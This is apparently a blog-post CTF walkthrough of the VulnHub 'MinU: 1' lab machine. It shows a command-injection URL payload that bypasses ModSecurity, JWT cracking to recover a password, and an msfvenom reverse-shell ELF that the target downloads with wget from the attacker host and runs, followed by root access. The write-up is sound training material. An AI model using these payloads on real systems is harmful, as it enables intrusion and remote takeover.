@@ -1,0 +1,550 @@
+
+								
+																		Hack the MinU: 1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 22, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello Friends! Today we are going to solve another CTF challenge “MinU: 1” This boot2root is an Ubuntu Based virtual machine and has been tested using Virtualbox. The network interface of the virtual machine will take its IP settings from DHCP. Your goal is to capture the flag on /root.
+You can download it from here: https://www.vulnhub.com/entry/minu-1,235/
+Level: Easy/Intermediate
+Penetrating Methodology
+
+Network scanning (Nmap)
+Web Directory Enumeration (Dirb)
+Found RCE Vulnerability
+Digging out JSON Web Token from inside ._pw_
+Obtain password by using “c-jwt-cracker” for JSON Web Token
+Generate elf payload (msfvenom)
+Upload the backdoor inside /tmp
+Obtain reverse session (Netcat)
+Go for root access
+Use environment shell to spawn proper tty shell
+Capture the Flag
+
+Walkthrough
+Since the IP of the target machine is 192.168.1.108, therefore let’s start with nmap aggressive scan.
+
+		
+		
+			
+			
+			
+			
+nmap –A 192.168.1.108
+			
+				
+					
+				
+					1
+				
+						nmap –A 192.168.1.108
+					
+				
+			
+		
+
+ 
+From the nmap scan result, we found port 80 is open for http service, let’s navigate to port 80 through browser.
+
+Since we found nothing at the home page, therefore next we used dirb for web directory enumeration.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.108/ -X .php
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.108/ -X .php
+					
+				
+			
+		
+
+With the help of above command, we try to enumerate .php extension files and luckily we found a “test.php” file.
+
+So, when we explored /test.php file in the browser, it welcomes us with the following web page, where we found a hyperlink for the next web page.
+
+Here the web page “Read last visitor data” was vulnerable to remote code execution. As you can observe that in the URL we try to run pwd command. As result, it shown /var/www/html as the current directory.
+
+Next, we had used wafwoof for scanning the type of web application firewall used on the target machine.
+
+		
+		
+			
+			
+			
+			
+wafw00f http://192.168.1.108
+			
+				
+					
+				
+					1
+				
+						wafw00f http://192.168.1.108
+					
+				
+			
+		
+
+After we run wafw00f we find that the target machine has implemented modsecurity as web application firewall.
+
+After finding out the WAF, we bypass it by executing following command in the URL.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+lsb_release -a
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+lsb_release -a
+					
+				
+			
+		
+
+
+Hence we found out the kernel details of the target machine.
+Similarly, we run following command to find out available user directory inside the /home folder.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls /home
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls /home
+					
+				
+			
+		
+
+
+So we found bob could be the name of user directory.
+Then we run following command to view the available file and folder inside /home/bob.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls -la /home/bob
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls -la /home/bob
+					
+				
+			
+		
+
+Here we found a file”._pw_”
+
+Then we opened the above obtained file with help of cat command and for that we run the following command.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+cat /home/bob/._pw_
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+cat /home/bob/._pw_
+					
+				
+			
+		
+
+It put up some encoded text in front of us which could be the password but I did not know much about it, what this was, therefore I take help from google and found out that this is a JSON Web Token.
+
+JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.
+Source: https://jwt.io/introduction/
+So I found a tool from the github to crack the JSON web token called c-jwt-cracker.
+
+		
+		
+			
+			
+			
+			
+git clone https://github.com/brendan-rius/c-jwt-cracker.git
+cd c-jwt-cracker/
+apt-get install libssl-dev
+make
+			
+				
+					
+				
+					1234
+				
+						git clone https://github.com/brendan-rius/c-jwt-cracker.gitcd c-jwt-cracker/apt-get install libssl-devmake
+					
+				
+			
+		
+
+
+Copy the encoded text from the “._pw_” to decrypt it.  Now run the c-jwt-crack tool and paste the encoded string as its argument as shown in the image.
+
+		
+		
+			
+			
+			
+			
+./jwtcrack [paste code here]
+			
+				
+					
+				
+					1
+				
+						./jwtcrack [paste code here]
+					
+				
+			
+		
+
+This will give the password: “mlnv1”
+
+Now let’s create a payload using msfvenom with the help of following command:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.106 lport=4444 -f elf &gt; /root/Desktop/shell
+			
+				
+					
+				
+					1
+				
+						msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.106 lport=4444 -f elf &gt; /root/Desktop/shell
+					
+				
+			
+		
+
+Above command will generate the elf payload, now we will transfer this malicious file “shell” to the target with the help of PHP server.
+
+		
+		
+			
+			
+			
+			
+php –S 0.0.0.0:80
+			
+				
+					
+				
+					1
+				
+						php –S 0.0.0.0:80
+					
+				
+			
+		
+
+
+Then download the above malicious file with the help of wget, hence you can run the following command for downloading it into target machine.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+wget+-O+/tmp/shell+http://192.168.1.106/shell
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+wget+-O+/tmp/shell+http://192.168.1.106/shell
+					
+				
+			
+		
+
+
+Now let’s check whether the file is uploaded successfully or not!
+Run following command to view the malicious file “shell” file inside the /tmp directory.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls /tmp
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls /tmp
+					
+				
+			
+		
+
+Yuppieee!!! In the given below image you can observe that we have successfully uploaded the shell file.
+
+Now give the full permission to the uploaded file “shell” with the help of the following command:
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+chmod 777 /tmp/shell
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+chmod 777 /tmp/shell
+					
+				
+			
+		
+
+
+ 
+Let’s verify the given permission with help of the following command:
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls -la /tmp/shell
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+ls -la /tmp/shell
+					
+				
+			
+		
+
+
+Now let’s execute the file “shell” but do not forget to start netcat as the listener.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+/tmp/shell
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/test.php?file=www.hackingarticles.in;+$u+/tmp/shell
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+nc –lvp 4444
+			
+				
+					
+				
+					1
+				
+						nc –lvp 4444
+					
+				
+			
+		
+
+Hurray!!! We got the reverse shell of the target’s machine and now let’s try to grab the flag.txt file to finish this task. For grabbing the flag.txt file we need the root access and proper tty shell of the machine.
+Here we try to use python-one-liner to spawn a tty shell but unfortunately python was not installed on the target machine. So instead we used environment variable to spawn the tty shell.
+Now run the following commands to spawn the tty shell and then try to capture flag.txt file.
+
+		
+		
+			
+			
+			
+			
+bash -i
+SHELL=/bin/bash script -q /dev/null
+su root
+			
+				
+					
+				
+					123
+				
+						bash -iSHELL=/bin/bash script -q /dev/nullsu root
+					
+				
+			
+		
+
+Boooom!!!! We have root access now let’s fetch the flag.txt file.
+
+		
+		
+			
+			
+			
+			
+ls
+cat flag.txt
+			
+				
+					
+				
+					12
+				
+						lscat flag.txt
+					
+				
+			
+		
+
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
